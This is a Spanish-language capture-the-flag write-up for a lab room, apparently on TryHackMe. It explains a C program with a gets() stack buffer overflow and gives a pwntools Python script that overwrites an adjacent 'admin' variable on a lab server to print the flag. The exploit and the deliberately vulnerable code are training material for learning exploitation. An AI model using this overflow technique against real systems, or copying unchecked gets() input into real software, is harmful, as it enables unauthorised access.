# Introducción

En esta máquina nos encontraremos con conceptos como Buffer Overflow, Assemby y Exploit development. 

# Materiales

Necesitaremos los archivos (que podemos descargar directamente)

O si tenemos la Attack box en la ruta : /root/Rooms/TryPwnMeOne

![image](https://github.com/user-attachments/assets/3d1ff79e-868e-40f5-9498-9ff74993436b)

# TryOverflow Me 1

Tenemos que intentar conseguir la flag de lservidor remoto en mi caso la ip: 10.10.117.33 9003

```
int main(){
    setup();
    banner();
    int admin = 0;
    char buf[0x10];

    puts("PLease go ahead and leave a comment :");
    gets(buf);

    if (admin){
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        char ch;
        while ((ch = fgetc(file)) != EOF) {
            putchar(ch);
    }
    fclose(file);
    }

    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```

De aquí tenemos que entender el binario.

Por lo que veo donde esta lo importante es la declaración del admin = 0 en el momento que sea 1 sera admin, con lo cuál vemos un "char bug[0x10] haciendo que no se puedan ingresar mas de 16 caracteres, posteriormente nos encontramos con el gest();

Con eso tenemos un bugger overflow pudiendo ingresar mas caracteres y afectando a la variable.

Y como vemos si admin es distintio a 0 se abrira el archivo flag.txt en modo lectura.

# SOLUCION

Usando un script en python podemos habilitar una conexión entre el target y la máquina. Crafteando un payload con 16 bytes seguido de repetir el valor de la variable admin hasta cambiar el valor.

```
from pwn import *

# Target IP and port
target_ip = '10.10.23.250'
target_port = 9003

# Connect to the remote server
p = remote(target_ip, target_port)

# Craft the payload
padding = b'A' * 16   # 16 bytes to fill the buffer
admin_value = p32(1) * 64  

payload = padding + admin_value 

# Send the payload
p.sendline(payload)

# Interact with the program to see the result (e.g., flag output)
p.interactive()
```

Acordemonos de tener installadas las pwntools

```
pip install pwntools
```




